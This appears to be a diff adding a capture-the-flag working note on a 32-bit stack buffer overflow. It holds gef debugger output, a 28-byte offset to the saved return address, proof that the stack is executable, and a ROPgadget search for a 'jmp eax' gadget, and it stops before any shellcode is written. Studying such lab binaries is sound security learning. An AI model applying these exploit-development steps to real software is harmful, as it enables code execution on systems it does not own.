@@ -1,0 +1,37 @@
+
+# Buffer begins: 0xffffcf60
+# EIP Location:  0xffffcf7c
+# =========================
+#                0x1c (28)
+
+# gef > context regs
+"""
+$eax   : 0xffffcf60  →  "AAAAAA"                                                                                                                                                                               
+$ebx   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al                                                                                                                                                                    
+$ecx   : 0x80e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah                                                                                                                                                                           
+$edx   : 0xffffcf66  →  0x50000800                                                                                                                                                                                                         
+$esp   : 0xffffcf7c  →  0x8049e2a  →  <main+89> mov eax, 0x0                                                                                                                                                                               
+$ebp   : 0xffffcf98  →  0x00000000                                                                                                                                                                                                         
+$esi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al                                                                                                                                                                    
+$edi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al                                                                                                                                                                    
+$eip   : 0x8049dd0  →  <vuln+59> ret
+"""
+# eax points to the start of our buffer
+# gef > vmmap
+"""
+0xfffdd000 0xffffe000 0x000000 rwx [stack]
+"""
+# Our buffer is located within these bounds meaning it is in the executable stack area. 
+# So we can write shellcode write after the return address, and on buf we can return to this area.
+
+# First define a ROP gadget
+# $ ROPgadget --binary vuln | grep "jmp eax"
+"""
+0x0805334b : jmp eax
+"""
+# Now we need to find a command to jump to after the return address
+#
+#
+
+# The instruction jmp esp is \xff\xe4
+
